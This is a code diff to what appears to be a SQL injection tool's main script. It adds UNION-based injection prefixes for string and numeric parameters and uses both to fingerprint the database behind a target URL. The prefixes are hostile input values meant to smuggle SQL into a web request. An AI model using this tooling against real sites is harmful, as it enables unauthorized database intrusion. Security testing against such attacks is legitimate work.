@@ -1,11 +1,18 @@
 from sys import argv, exit
 from requests import ConnectionError
 from time import sleep
+from enum import Enum
+
 
 # Local Modules
 from determine import determine_dbms
 from parser import parse_args
 import printer
+
+
+class Poison(Enum):
+    NUMERIC = "0 UNION "
+    ALNUM = "' UNION "
 
 
 if __name__ == "__main__":
@@ -26,7 +33,11 @@ if __name__ == "__main__":
     while (True):
         try:
             version = determine_dbms(
-                opts.URL, opts.SUCCESS_STR, opts.ERROR_STR, int(opts.COLUMNS or "0"), brute_force)
+                opts.URL, opts.SUCCESS_STR, opts.ERROR_STR, Poison.ALNUM.value, int(opts.COLUMNS or "0"), brute_force)
+            if version is None:
+                version = determine_dbms(
+                    opts.URL, opts.SUCCESS_STR, opts.ERROR_STR, Poison.NUMERIC.value, int(opts.COLUMNS or "0"), brute_force)
+
             break
         except ConnectionError:
             sleep(1)
